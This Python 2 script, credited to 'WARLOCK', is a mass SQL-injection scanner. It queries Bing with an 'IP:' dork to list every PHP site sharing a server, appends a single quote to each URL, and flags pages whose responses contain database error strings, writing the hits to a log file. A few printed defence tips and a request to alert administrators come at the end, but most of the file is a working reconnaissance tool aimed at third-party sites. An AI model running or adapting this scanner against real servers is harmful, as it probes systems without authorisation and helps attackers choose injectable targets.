#ALL WEBSITE ON SAME SERVER SQL INJECTION USING BING DORK...
import urllib
import os
import re
from time import sleep
def sqlihunt(dork , filename ):
   
  # extract Urls from a Bing search engin querying the given dork and test every url in 
  # the result is stored in a text file
  dork= 'IP:'+dork+" php?id= "
  file2 =open(filename+'.txt','w')
  start=0
  end=200
  sleep(3)
  print"\n[+]FETCHING LISTs OF WEBSITES OF SAME SERVER... "
  print"\n[+]RESULT WILL BE WRITTEN BELOW...."
  while start<=end :
    try:
      con = urllib.urlretrieve('http://www.bing.com/search?q='+dork+"&first="+str(start))
      #con = con = urllib.urlretrieve('http://www.bing.com/search?q=ip%3A41.203.11.42+%22php%3Fid%3D%22&go=&qs=ds&form=QBLH&filt=all')
      conf = open(con[0])
      readd=conf.read()
      find=re.findall('<h2><a href="(.*?)"',readd)
      start = start+10
      #return find 
    except IOError:
      print "\n[-]NETWORK ERROR "
      print "\n[-]RECONNECTING... "
      sleep(10)
      print "\n[+]RECONNECTING... "
    try :
      for i in range(len(find)):
                  rez=find[i]+"'"
                  tst = urllib.urlretrieve(rez)
                  tstf = open(tst[0])
                  tstdd= tstf.read()
                  tstfind=re.findall('/error in your SQL syntax|mysql_fetch_array()|execute query|mysql_fetch_object()|mysql_num_rows()|mysql_fetch_assoc()|mysql_fetch_row()|SELECT * FROM|supplied argument is not a valid MySQL|Syntax error|Fatal error/i|You have an error in your SQL syntax|Microsoft VBScript runtime error',tstdd)
                  if(tstfind):
                    print "\n\n[+]SQL INJECTION BUG FOUND AT : "+rez+"\n\n" 
                    file2.write(rez + '\n')
                  else:
                    print "[-]NO SQL INJECTION BUG FOUND AT : "+rez
    except IOError:
      print "[-]UNKNOWN ERROR"
##########################################################################################################################

print "\n\t\t#################################################"
print "\t\t#                                               #"
print "\t\t#        WHOLE SERVER SQL INJECTION TEST        #"
print "\t\t#                  BY WARLOCK                   #"
print "\t\t#                                               #"
print "\t\t#################################################"
param1 = raw_input("\n[+]ENTER SERVER's IP-ADRESS : ")
param2 = 'log'
sqlihunt(param1 , param2 )
print"\n[+]LOGS ARE SAVED TO THE TEXT FILE log.txt"


print"\n[+]YOU FOUND YOUR WEBSITE IN SQL INJECTION LIST???"
o=raw_input("y or n : ")

if o=='y':
  print"\n[+]DO WANT SOME HINTS TO STOP THIS ATTACK ???"
  v=raw_input("y or n : ")
  if v=='y':
    print"\n[+]STEP 1.  FILTER META CHARACTERS [e.g. ',%,-- etc etc ] FROM YOUR WEB APPLIACTAION"
    print"\n[+]STEP 2.  MAKE YOUR DATABASE TO READ ONLY"
    print"\n[+]STEP 3.  TRY TO REDIRECT THE ERROR MESSAGES TO OTHER PLACE...THIS WILL MAKE WEB APPLICATION MORE SECURE"
    print"\n[+}STEP 4.  IF YOU ARE COMPLETLY UNKNOWN TO THIS STUFF...PLEASE EMAIL ME AT nisargjani20996@gmail.com OR CONSULT TO PENTESTERS / IT CONSULTERS"
  else:
    pass
else:
  pass

print"\n[+]DO YOU FONUD ANY OTHER WEBSITE WHICH IS IN SQL INJECTION LIST???"
p=raw_input('y or n : ')
if p=='y':
  print"\n[+]PLEASE CONTACT SERVER ADMINISTRATOR OTHERWISE YOUR WEB APPLICATION ALSO CAN BE HACKED"
else:
  pass

raw_input("\n[+]PRESS ANY KEY TO EXIT")
